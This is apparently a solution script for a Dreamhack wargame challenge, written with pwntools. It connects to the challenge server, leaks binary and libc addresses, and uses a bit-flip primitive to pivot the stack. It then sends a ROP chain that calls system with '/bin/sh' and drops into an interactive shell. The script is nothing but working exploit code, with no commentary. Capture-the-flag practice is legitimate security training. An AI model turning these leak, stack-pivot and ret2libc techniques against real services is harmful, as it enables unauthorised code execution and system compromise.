from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 14741
r = remote(HOST, PORT)

def flip(offset, idx):
    r.sendlineafter(b'>> ', b'2')
    r.sendlineafter(b': ', b'%d'%offset)
    r.sendlineafter(b': ', b'%d'%idx)
    
r.sendlineafter(b'>> ', b'1')
r.sendafter(b'>> ', b'A'*0x1000)
r.sendlineafter(b'>> ', b'1')
r.recvuntil(b'A'*0x1000)
binary = u64(r.recvline().strip().ljust(8,b'\x00')) - 0x2008
msg = binary + 0x4020
r.sendline(b'A')

flip(0x30, 6)

r.recvline()
r.recvline()

libc = u64(r.recv(6).ljust(8,b'\x00')) - 0x620d0
binsh = libc + 0x1d8698
system = libc + 0x50d60
pop_rdi = libc + 0x2a3e5
leave = libc + 0x562ec
pop_rsp = libc + 0x35732

offset = next(0x17+i*0x100 for i in range(20) if not 0x30 <= p64(msg+0x17+i*0x100)[1] <= 0x39)
rbp = msg + offset

payload = flat([
    b'A'*offset,
    0,
    pop_rsp,msg+0xe00,
])

payload = payload.ljust(0xe00)

payload += flat([
    pop_rdi,binsh,
    system
])

r.sendline(b'1')
r.sendlineafter(b'>> ', payload)
r.sendlineafter(b'>> ', b'2')
r.sendlineafter(b': ', b'%d'%0x28)
r.sendlineafter(b': ', p64(rbp) + p64(leave)[:6])

r.interactive()